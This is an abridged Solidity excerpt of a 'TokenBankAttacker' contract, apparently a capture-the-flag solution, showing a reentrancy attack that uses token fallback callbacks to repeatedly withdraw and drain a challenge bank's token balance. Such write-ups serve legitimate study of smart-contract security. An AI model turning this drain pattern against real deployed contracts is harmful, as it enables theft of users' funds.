...
contract TokenBankAttacker {
    ...
    function deposit() external payable {
        uint256 balanceInsideAttack = challenge.token().balanceOf(address(this));
        challenge.token().transfer(address(challenge), balanceInsideAttack);
    }
    ...
    function tokenFallback(address from, uint256 value, bytes calldata) external {
        require(msg.sender == address(challenge.token()), "not from original token");
    ...
    function callWithdraw() private {
        ...
        uint256 balanceToDrain = challenge.token().balanceOf(address(challenge));
        if (balanceToDrain > 0) {
            uint256 balanceToWithdraw =
                myInitialBalance < balanceToDrain ? myInitialBalance : balanceToDrain;
            challenge.withdraw(balanceToWithdraw);
        }
    }
}
